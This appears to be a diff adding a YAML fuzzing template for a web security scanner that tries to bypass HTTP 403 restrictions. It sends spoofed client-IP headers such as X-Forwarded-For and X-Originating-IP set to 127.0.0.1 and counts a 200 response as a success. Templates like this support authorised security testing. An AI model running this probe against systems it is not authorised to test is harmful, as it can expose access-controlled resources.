@@ -1,0 +1,24 @@
+id: 403-Bypass-Header
+type: fuzz
+info:
+  Author: Gocha Okradze
+  name: Header Based 403 Status Code Bypass
+  risk: High
+  
+variables:
+  - head: |
+      X-Custom-IP-Authorization
+      X-Originating-IP
+      X-Forwarded-For
+      X-Remote-IP
+      X-Client-IP
+      X-Host
+      X-Forwarded-Host
+
+payloads: 
+  - "127.0.0.1"        
+requests:
+  - generators:
+      - Header("{{.payload}}", "{{.head}}")
+    detections:
+        - StatusCode() == 200
